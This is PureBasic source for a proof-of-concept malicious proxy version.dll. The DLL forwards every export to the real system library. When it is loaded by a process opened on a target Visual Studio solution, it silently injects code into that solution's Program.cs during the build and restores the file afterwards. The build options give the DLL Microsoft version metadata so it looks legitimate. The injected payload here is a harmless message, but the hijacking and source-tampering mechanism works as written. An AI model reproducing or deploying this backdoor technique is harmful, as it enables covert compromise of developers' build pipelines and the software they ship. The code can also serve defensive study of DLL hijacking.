; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie@a12d404.net)                                *
; * License:     BSD 2-clause                                               *
; * Copyright:   (c) 2021, a12d404.net                                      *
; * Status:      Prototype                                                  *
; * Created:     20200116                                                   *
; * Last Update: 20200117                                                   *
; *                                                                         *
; ***************************************************************************
EnableExplicit

; ---------------------------------------------------------------------------
;- Consts

#TARGET_SOLUTION = "ConsoleApp1.sln"
#BACKDOOR_CODE = "public Class1() { Console.WriteLine(" + Chr(34) + "Hello from the Static initializer!" + Chr(34) + "); }"
#BACKDOOR_INSERT_AFTER = "class Class1 {"

#BACKDOOR_ALIVE = $c45c9bda8db1
#MIN_SIZE = 100 ; 100 bytes

; ---------------------------------------------------------------------------
;- Variables
Global mux.i = #Null      ; set in DLL_PROCESS_ATTACH
Global hVersion.i = #Null ; orig version.dll handle
Global active.i = 0       ; checked in CleanupBackdoor

Global origContent.s = ""   ; ptr to memory of the original source
Global origContentSize.i = 0 ; size of the original source

; ---------------------------------------------------------------------------
;- Backdoor Handling

Procedure.s GetTargetFilePath()
  Define i.i
  Define path.s
  For i = 0 To CountProgramParameters()
    path = ProgramParameter(i)
    If CountString(path, #TARGET_SOLUTION) > 0
      ProcedureReturn GetPathPart(path) + "Program.cs"
    EndIf
  Next
  ProcedureReturn ""
EndProcedure

Procedure.b ReadOrigContent(hFile.i)
  Define res.b = #False
  FileSeek(hFile, 0, #PB_Absolute)
  Define size.i = Lof(hFile)
  Define *mem = AllocateMemory(size)
  If ReadData(hFile, *mem, size) <> size
    Goto ReadAllCleanup
  EndIf
  origContent = PeekS(*mem, size, #PB_UTF8)
  origContentSize = Len(origContent)
  res = #True
ReadAllCleanup:
  If *mem
    FreeMemory(*mem)
  EndIf
  ProcedureReturn res
EndProcedure

; InsertBackdoor needs to be called from a function holing mux!
Procedure.b InsertBackdoor(path.s)
  Define res.b = #False
  
  Define hFile.i = OpenFile(#PB_Any, path, #PB_File_SharedRead | #PB_UTF8)
  If Not hFile
    ProcedureReturn res
  EndIf
  
  ; read file content
  If Not ReadOrigContent(hFile)
    Goto InsertBackdoorError
  EndIf
  
  ; check if the right code is present
  Define pos.i = FindString(origContent, #BACKDOOR_INSERT_AFTER)-1
  If pos < 0
    Goto InsertBackdoorError
  EndIf
  
  ; revert file to 0
  FileSeek(hFile, 0, #PB_Absolute)
  TruncateFile(hFile)
  
  ; write content till start of backdoor
  Define writeSize.i = pos+Len(#BACKDOOR_INSERT_AFTER)
  Define sizeLeft = writeSize
  If WriteString(hFile, Left(origContent, writeSize), #PB_UTF8) = 0
    ; we should add a restore of the original file here
    ; ... depending on the write error ...
    Goto InsertBackdoorError
  EndIf
  
  ; write backdoor
  writeSize = Len(#BACKDOOR_CODE)
  
  If WriteString(hFile, #BACKDOOR_CODE, #PB_UTF8) = 0
    ; we should add a restore of the original file here
    ; ... depending on the write error ...
    Goto InsertBackdoorError
  EndIf
  
  ; write rest of file
  writeSize = origContentSize-sizeLeft
  If WriteString(hFile, Right(origContent, writeSize), #PB_UTF8) = 0
    ; we should add a restore of the original file here
    ; ... depending on the write error ...
    Goto InsertBackdoorError
  EndIf
  
  res = #True
InsertBackdoorCleanup:
  CloseFile(hFile)
  ProcedureReturn res
InsertBackdoorError:  
  If Len(origContent) > 0
    origContent = ""
    origContentSize= 0
  EndIf
  Goto InsertBackdoorCleanup
EndProcedure

Procedure ActivateBackdoor()
  LockMutex(mux)
  ; check if the backdoor is already alive
  If #BACKDOOR_ALIVE = active
    Goto ActivateBackdoorCleanup
  EndIf
  ; check if we have the right solution
  Define targetFilepath.s = GetTargetFilePath()
  If Len(targetFilepath) < 1
    Goto ActivateBackdoorCleanup
  EndIf
  
  MessageRequester("ActivateBackdoor", "Hello World from Solution: " + #CRLF$ + ProgramParameter(0))
  
  ; init backdoor
  If InsertBackdoor(targetFilepath)
    active = #BACKDOOR_ALIVE
    MessageRequester("ActivateBackdoor", "... backdoor insered ...")
  Else
    MessageRequester("ActivateBackdoor", "... backdooring failed ...")
  EndIf
  
ActivateBackdoorCleanup:
  UnlockMutex(mux)
  ProcedureReturn
EndProcedure

Procedure CleanupBackdoor()
  LockMutex(mux)
  If #BACKDOOR_ALIVE = active
    active = #Null
    ; Do cleanup here
    If origContentSize <> 0
      Define hFile.i = CreateFile(#PB_Any, GetTargetFilePath(), #PB_UTF8)
      If hFile
        WriteString(hFile, origContent, #PB_UTF8)
        CloseFile(hFile)
      EndIf
      origContent = ""
      origContentSize = 0
    EndIf
  EndIf
CleanupBackdoorCleanup:
  UnlockMutex(mux)
  ProcedureReturn
EndProcedure

; ---------------------------------------------------------------------------
;- DllMain Stuff

ProcedureDLL AttachProcess(Instance)
  mux = CreateMutex()
EndProcedure

ProcedureDLL DetachProcess(Instance)
  CleanupBackdoor()
EndProcedure

; ---------------------------------------------------------------------------
;- orig VERSION.dll Stuff

Procedure.i LoadVersionDll()
  Define res.i = #Null
  LockMutex(mux)
  If #Null = hVersion
    ; load version.dll
    Define dllPath.s = GetEnvironmentVariable("windir") + "\system32\version.dll"
    hVersion = OpenLibrary(#PB_Any, dllPath)
  EndIf
  res = hVersion
CleanupLoadVersionDll:
  UnlockMutex(mux)
  ProcedureReturn res
EndProcedure

;BOOL GetFileVersionInfoA(
;  LPCSTR lptstrFilename,
;  DWORD  dwHandle,
;  DWORD  dwLen,
;  LPVOID lpData
;);
ProcedureDLL.i GetFileVersionInfoA(a1.i, a2.l, a3.l, a4.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoA", a1, a2, a3, a4)
EndProcedure


;BOOL GetFileVersionInfoExA(
;  DWORD  dwFlags,
;  LPCSTR lpwstrFilename,
;  DWORD  dwHandle,
;  DWORD  dwLen,
;  LPVOID lpData
;);
ProcedureDLL.i GetFileVersionInfoExA(a1.l, a2.i, a3.l, a4.l, a5.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoExA", a1, a2, a3, a4, a5)
EndProcedure


;BOOL GetFileVersionInfoExW(
;  DWORD   dwFlags,
;  LPCWSTR lpwstrFilename,
;  DWORD   dwHandle,
;  DWORD   dwLen,
;  LPVOID  lpData
;);
ProcedureDLL.i GetFileVersionInfoSizeExW(a1.l, a2.i, a3.l, a4.l, a5.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoSizeExW", a1, a2, a3, a4, a5)
EndProcedure


;DWORD GetFileVersionInfoSizeA(
;  LPCSTR  lptstrFilename,
;  LPDWORD lpdwHandle
;);
ProcedureDLL.i GetFileVersionInfoSizeA(a1.i, a2.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoSizeA", a1, a2)
EndProcedure


;DWORD GetFileVersionInfoSizeExA(
;  DWORD   dwFlags,
;  LPCSTR  lpwstrFilename,
;  LPDWORD lpdwHandle
;);
ProcedureDLL.i GetFileVersionInfoSizeExA(a1.l, a2.i, a3.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoSizeExA", a1, a2, a3)
EndProcedure


;DWORD GetFileVersionInfoSizeExW(
;  DWORD   dwFlags,
;  LPCWSTR lpwstrFilename,
;  LPDWORD lpdwHandle
;);
ProcedureDLL.i GetFileVersionInfoExW(a1.l, a2.i, a3.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoExW", a1, a2, a3)
EndProcedure


;DWORD GetFileVersionInfoSizeW(
;  LPCWSTR lptstrFilename,
;  LPDWORD lpdwHandle
;);
ProcedureDLL.i GetFileVersionInfoSizeW(a1.i, a2.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoExW", a1, a2)
EndProcedure


;BOOL GetFileVersionInfoW(
;  LPCWSTR lptstrFilename,
;  DWORD   dwHandle,
;  DWORD   dwLen,
;  LPVOID  lpData
;);
ProcedureDLL.i GetFileVersionInfoW(a1.i, a2.l, a3.l, a4.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoW", a1, a2, a3, a4)
EndProcedure


; int hMem, LPCWSTR lpFileName, int v2, int v3
ProcedureDLL.i GetFileVersionInfoByHandle(a1.i, a2.i, a3.i, a4.l)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoByHandle", a1, a2, a3, a4)
EndProcedure


;DWORD VerFindFileA(
;  DWORD  uFlags,
;  LPCSTR szFileName,
;  LPCSTR szWinDir,
;  LPCSTR szAppDir,
;  LPSTR  szCurDir,
;  PUINT  puCurDirLen,
;  LPSTR  szDestDir,
;  PUINT  puDestDirLen
;);
ProcedureDLL.i VerFindFileA(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "VerFindFileA", a1, a2, a3, a4, a5, a6, a7, a8)
EndProcedure

;DWORD VerFindFileW(
;  DWORD   uFlags,
;  LPCWSTR szFileName,
;  LPCWSTR szWinDir,
;  LPCWSTR szAppDir,
;  LPWSTR  szCurDir,
;  PUINT   puCurDirLen,
;  LPWSTR  szDestDir,
;  PUINT   puDestDirLen
;);
ProcedureDLL.i VerFindFileW(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "VerFindFileW", a1, a2, a3, a4, a5, a6, a7, a8)
EndProcedure

;DWORD VerInstallFileA(
;  DWORD  uFlags,
;  LPCSTR szSrcFileName,
;  LPCSTR szDestFileName,
;  LPCSTR szSrcDir,
;  LPCSTR szDestDir,
;  LPCSTR szCurDir,
;  LPSTR  szTmpFile,
;  PUINT  puTmpFileLen
;);
ProcedureDLL.i VerInstallFileA(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "VerInstallFileA", a1, a2, a3, a4, a5, a6, a7, a8)
EndProcedure

;DWORD VerInstallFileW(
;  DWORD   uFlags,
;  LPCWSTR szSrcFileName,
;  LPCWSTR szDestFileName,
;  LPCWSTR szSrcDir,
;  LPCWSTR szDestDir,
;  LPCWSTR szCurDir,
;  LPWSTR  szTmpFile,
;  PUINT   puTmpFileLen
;);
ProcedureDLL.i VerInstallFileW(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "VerInstallFileW", a1, a2, a3, a4, a5, a6, a7, a8)
EndProcedure

;DWORD VerLanguageNameA(
;  DWORD wLang,
;  LPSTR szLang,
;  DWORD cchLang
;);
ProcedureDLL.i VerLanguageNameA(a1.l, a2.i, a3.l)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "VerLanguageNameA", a1, a2, a3)
EndProcedure

;DWORD VerLanguageNameW(
;  DWORD  wLang,
;  LPWSTR szLang,
;  DWORD  cchLang
;);
ProcedureDLL.i VerLanguageNameW(a1.l, a2.i, a3.l)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "VerLanguageNameW", a1, a2, a3)
EndProcedure

;BOOL VerQueryValueA(
;  LPCVOID pBlock,
;  LPCSTR  lpSubBlock,
;  LPVOID  *lplpBuffer,
;  PUINT   puLen
;);
ProcedureDLL.i VerQueryValueA(a1.i, a2.i, a3.i, a4.l)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "VerQueryValueA", a1, a2, a3, a4)
EndProcedure

;BOOL VerQueryValueW(
;  LPCVOID pBlock,
;  LPCWSTR lpSubBlock,
;  LPVOID  *lplpBuffer,
;  PUINT   puLen
;);
ProcedureDLL.i VerQueryValueW(a1.i, a2.i, a3.i, a4.l)
  ActivateBackdoor()
  ProcedureReturn CallCFunction(LoadVersionDll(), "VerQueryValueW", a1, a2, a3, a4)
EndProcedure

; ---------------------------------------------------------------------------

; IDE Options = PureBasic 5.73 LTS (Windows - x64)
; ExecutableFormat = Shared dll
; CursorPosition = 85
; FirstLine = 60
; Folding = -----
; Executable = version.dll
; CompileSourceDirectory
; EnablePurifier
; IncludeVersionInfo
; VersionField2 = Microsoft Corporation
; VersionField3 = Microsoft® Windows® Operating System
; VersionField5 = 10.0.20190.1000 (WinBuild.160101.0800)
; VersionField6 = Version Checking and File Installation Libraries
; VersionField7 = version
; VersionField8 = VERSION.DLL
; VersionField9 = © Microsoft Corporation. All rights reserved.
; VersionField15 = VOS_NT
; VersionField16 = VFT_DLL